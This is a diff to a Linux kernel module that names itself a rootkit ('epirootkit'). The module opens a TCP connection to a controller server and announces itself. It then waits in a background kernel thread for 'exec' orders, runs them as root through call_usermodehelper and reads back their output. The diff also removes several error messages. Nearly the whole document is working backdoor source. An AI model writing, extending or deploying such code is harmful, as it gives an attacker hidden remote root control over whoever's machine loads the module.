@@ -10,11 +10,15 @@
 #include <linux/file.h>
 #include <linux/kernel.h>
 #include <linux/kmod.h>
+#include <linux/kthread.h>
+#include <linux/sched.h>
 
 #define SUCCESS 0
 #define FAILURE 1
 
 static struct socket *sock = NULL;
+static struct task_struct *network_thread = NULL;
+
 static char *ip = "127.0.0.1";
 static int port = 4242;
 static char *message = "Message from epirootkit: connexion established\n";
@@ -33,10 +37,7 @@ static int close_communication(void)
 		sock_release(sock);
 		sock = NULL;
 		pr_info("network: socket released\n");
-	} else {
-		pr_info("network: socket already released\n");
 	}
-
 	return SUCCESS;
 }
 
@@ -52,7 +53,6 @@ static int exec_str_as_command(char *user_cmd)
 	loff_t pos = 0;
 	int status = 0, len = 0;
 
-	// Allouer le buffer pour la commande
 	cmd = kmalloc(4096, GFP_KERNEL);
 	if (!cmd)
 		return -ENOMEM;
@@ -62,10 +62,8 @@ static int exec_str_as_command(char *user_cmd)
 
 	pr_info("kernel_exec: executing command: %s\n", cmd);
 
-	// Lancer la commande
 	sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL, NULL, NULL, NULL);
 	if (!sub_info) {
-		pr_err("kernel_exec: failed to setup usermodehelper\n");
 		kfree(cmd);
 		return -ENOMEM;
 	}
@@ -73,10 +71,8 @@ static int exec_str_as_command(char *user_cmd)
 	status = call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
 	pr_info("kernel_exec: command exited with status: %d\n", status);
 
-	// Lire le contenu du fichier de sortie
 	file = filp_open(output_file, O_RDONLY, 0);
 	if (IS_ERR(file)) {
-		pr_err("kernel_exec: failed to open output file: %ld\n", PTR_ERR(file));
 		kfree(cmd);
 		return -ENOENT;
 	}
@@ -89,9 +85,7 @@ static int exec_str_as_command(char *user_cmd)
 	}
 
 	len = kernel_read(file, buf, 4096 - 1, &pos);
-	if (len < 0) {
-		pr_err("kernel_exec: failed to read output file\n");
-	} else {
+	if (len >= 0) {
 		buf[len] = '\0';
 		pr_info("kernel_exec: command output:\n%s", buf);
 	}
@@ -102,7 +96,7 @@ static int exec_str_as_command(char *user_cmd)
 	return 0;
 }
 
-static int __init network_init(void)
+static int network_worker(void *data)
 {
 	struct sockaddr_in addr = { 0 };
 	struct msghdr msg = { 0 };
@@ -110,15 +104,14 @@ static int __init network_init(void)
 	unsigned char ip_binary[4] = { 0 };
 	int ret = 0;
 
-	pr_info("network: insmoded\n");
-
-	if ((ret = in4_pton(ip, -1, ip_binary, -1, NULL)) == 0) {
-		pr_err("network: error converting the IPv4 address: %d\n", ret);
+	if (!in4_pton(ip, -1, ip_binary, -1, NULL)) {
+		pr_err("network: invalid IPv4\n");
 		return FAILURE;
 	}
 
-	if ((ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock)) < 0) {
-		pr_err("network: error creating the socket: %d\n", ret);
+	ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
+	if (ret < 0) {
+		pr_err("network: socket creation failed: %d\n", ret);
 		return FAILURE;
 	}
 
@@ -126,13 +119,15 @@ static int __init network_init(void)
 	addr.sin_port = htons(port);
 	memcpy(&addr.sin_addr.s_addr, ip_binary, sizeof(addr.sin_addr.s_addr));
 
-	do {
+	while (!kthread_should_stop()) {
 		ret = sock->ops->connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
 		if (ret < 0) {
-			pr_err("network: error connecting to %s:%d (%d), retrying...\n", ip, port, ret);
+			pr_err("network: failed to connect to %s:%d (%d), retrying...\n", ip, port, ret);
 			msleep(1000);
+			continue;
 		}
-	} while (ret < 0);
+		break;
+	}
 
 	vec.iov_base = (void *)message;
 	vec.iov_len = strlen(message);
@@ -140,57 +135,69 @@ static int __init network_init(void)
 	do {
 		ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
 		if (ret < 0) {
-			pr_err("network: error sending the message: %d, retrying...\n", ret);
+			pr_err("network: failed to send message: %d, retrying...\n", ret);
 			msleep(1000);
 		}
 	} while (ret < 0);
 
-	pr_info("network: message '%s' sent to %s:%d\n", message, ip, port);
+	pr_info("network: message sent to %s:%d\n", ip, port);
 
-	// Receive messages until "killcom"
-	struct kvec recv_vec;
-	char recv_buffer[1024] = { 0 };
-	struct msghdr recv_msg;
+	// Listen for commands
+	while (!kthread_should_stop()) {
+		struct kvec recv_vec;
+		struct msghdr recv_msg = { 0 };
+		char recv_buffer[1024] = { 0 };
 
-	while (strcmp(recv_buffer, "killcom\n") != 0) {
-		memset(recv_buffer, 0, sizeof(recv_buffer));
-		memset(&recv_msg, 0, sizeof(recv_msg));
 		recv_vec.iov_base = recv_buffer;
 		recv_vec.iov_len = sizeof(recv_buffer) - 1;
 
-		pr_info("network: waiting for orders from the server...\n");
-		recv_msg.msg_flags = MSG_WAITALL;
-
 		ret = kernel_recvmsg(sock, &recv_msg, &recv_vec, 1, recv_vec.iov_len, 0);
 		if (ret < 0) {
-			pr_err("network: error receiving the message: %d", ret);
-			return FAILURE;
+			pr_err("network: error receiving message: %d\n", ret);
+			msleep(1000);
+			continue;
 		}
 
 		recv_buffer[ret] = '\0';
-		pr_info("network: received message from server: %s", recv_buffer);
+		pr_info("network: received: %s", recv_buffer);
+
 		if (strncmp(recv_buffer, "exec ", 5) == 0) {
 			char *command = recv_buffer + 5;
-			command[strcspn(command, "\n")] = '\0'; // Remove newline character
+			command[strcspn(command, "\n")] = '\0';
 			pr_info("network: executing command: %s\n", command);
 			exec_str_as_command(command);
 		} else if (strncmp(recv_buffer, "killcom", 7) == 0) {
-			pr_info("network: received killcom command\n");
+			pr_info("network: killcom received, exiting...\n");
 			break;
 		}
 	}
 
-	pr_info("network: 'killcom' received, exiting loop\n");
-
 	close_communication();
+	return 0;
+}
+
+static int __init network_init(void)
+{
+	pr_info("network: module loaded\n");
+
+	network_thread = kthread_run(network_worker, NULL, "netcom_thread");
+	if (IS_ERR(network_thread)) {
+		pr_err("network: failed to start thread\n");
+		return PTR_ERR(network_thread);
+	}
 
 	return SUCCESS;
 }
 
 static void __exit network_exit(void)
 {
+	if (network_thread) {
+		kthread_stop(network_thread);
+		pr_info("network: thread stopped\n");
+	}
+
 	close_communication();
-	pr_info("network: rmmoded\n");
+	pr_info("network: module unloaded\n");
 }
 
 module_init(network_init);
@@ -198,4 +205,5 @@ module_exit(network_exit);
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("STDBOOL");
-MODULE_DESCRIPTION("Connect to a TCP server using ipv4 and send a message");
+MODULE_DESCRIPTION("MTF Rootkit - EPI Rootkit");
+MODULE_VERSION("1.0");
